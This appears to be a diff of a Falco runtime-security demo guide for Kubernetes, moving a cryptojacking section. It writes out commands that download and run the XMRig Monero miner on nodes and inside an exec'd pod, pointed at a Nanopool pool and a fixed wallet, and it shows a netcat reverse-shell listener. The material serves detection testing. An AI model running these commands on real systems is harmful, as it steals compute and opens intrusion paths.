@@ -53,11 +53,84 @@ kubectl logs -n falco         falco-falcosidekick-ui-5b56bbd7cb-mtjkh
 2023/01/31 15:25:00 [INFO] : Falcosidekick UI is listening on 0.0.0.0:2802
 2023/01/31 15:25:00 [INFO] : log level is info
 
-## Install the Cryptominer
+## Cryptomining on the host
+
+
+Download 'untar' to install and run the cryptominer:
+
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+```
+cd xmrig-6.16.4
+```
+
+```
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
+```
+
+Now the cryptominer process is running in the k8s nodes - events should be visible in Falco Sidekick <br/>
+To delete all remnants of the miner, it's file directory and the tarbal:
+
+```
+rm -r xmrig-6.16.4
+```
+
+Removes the tarbal for the next demo:
+```
+rm -r xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+## Cryptojacking in a running container
+
+Download a pod definition file:
+```
+wget https://k8s.io/examples/pods/security/security-context-2.yaml
+```
+
+Create the pod
+```
+kubectl apply -f security-context-2.yaml
+```
+
+Make sure the pod is running
+```
+kubectl get pods
+```
+
+Exec into a running pod (compromise the pod):
+```
+kubectl exec -ti security-context-demo-2 -- sh
+```
+
+In your shell, list the running processes:
+```
+ps aux
+```
+The output shows that the processes are running as user 2000. <br/>
+This is the value of runAsUser specified for the Container. <br/>
+It overrides the value 1000 that is specified for the Pod.<br/>
+<br/>
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND <br/>
+2000         1  0.0  0.0   4336   764 ?        Ss   20:36   0:00 /bin/sh -c node server.js <br/>
+2000         8  0.1  0.5 772124 22604 ?        Sl   20:36   0:00 node server.js <br/>
+... <br/>
+<br/>
+Exit your shell:
+```
+exit
+```
+
+## Installing a cryptominer in a Kubernetes Deployment
 
 Create a namespace for the miner
 ```
-kubectl create namespace miner-test
+kubectl create ns miner-test
 ```
 
 Create a deployment called ``` deploy-miner.yaml``` with the below context to create the miner
@@ -127,7 +200,6 @@ And we will see in our logs something like:
 ```
 Mon Jan 30 10:56:26 2023: Loading rules from file /etc/falco/rules.d/rules-mining.yaml:
 ```
-
 
 ### Install on an EC2 instance
 ```
@@ -339,41 +411,4 @@ After this, launch a reverse shell listening on port 4242 with:
 
 ```
 nc -nlvp 4242
-```
-
-## Cryptojacking
-
-Exec into a running pod (compromise the pod):
-```
-kubectl exec -ti -n falco                falco-falcosidekick-bc4487d46-lf25l -- sh
-```
-
-And finally, download, untar, and install and run the cryptominer:
-
-```
-curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
-```
-
-```
-tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
-```
-
-```
-cd xmrig-6.16.4
-```
-
-```
-./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
-```
-
-Now the cryptominer process is running in the k8s cluster! <br/>
-To delete all remnants of the miner, it's file directory and the tarbal:
-
-```
-rm -r xmrig-6.16.4
-```
-
-Removes the tarbal for the next demo:
-```
-rm -r xmrig-6.16.4-linux-static-x64.tar.gz
 ```
